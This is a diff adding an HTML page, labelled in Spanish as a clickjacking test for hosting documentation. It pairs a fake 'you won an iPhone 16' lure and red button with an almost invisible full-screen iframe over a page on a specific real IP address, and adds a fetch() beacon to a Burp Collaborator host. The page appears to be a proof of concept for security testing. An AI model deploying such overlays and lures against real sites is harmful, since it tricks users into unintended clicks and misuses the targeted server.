@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Prueba Clickjacking - Documentación para Hosting</title></head>
+<body>
+<h1>¡FELICIDADES! Has ganado un iPhone 16</h1>
+<p>Haz clic en el botón rojo para reclamar tu premio ahora:</p>
+
+<button style="position:relative; width:300px; height:80px; font-size:24px; background:red; color:white; border:none; cursor:pointer; z-index:1;">
+  RECLAMAR PREMIO AHORA
+</button>
+
+<iframe src="https://37.27.227.98/cgi-sys/suspendedpage.cgi" 
+        style="position:absolute; top:0; left:0; width:1920px; height:1080px; opacity:0.0001; border:0; z-index:2;"
+        sandbox="allow-forms allow-scripts allow-modals">
+</iframe>
+
+<!-- Solo para demostrar que el iframe se carga -->
+<script>
+  fetch("https://d1q2w3e4r5t6y7.burpcollaborator.net/log?dominio=37.27.227.98");
+</script>
+</body>
+</html>
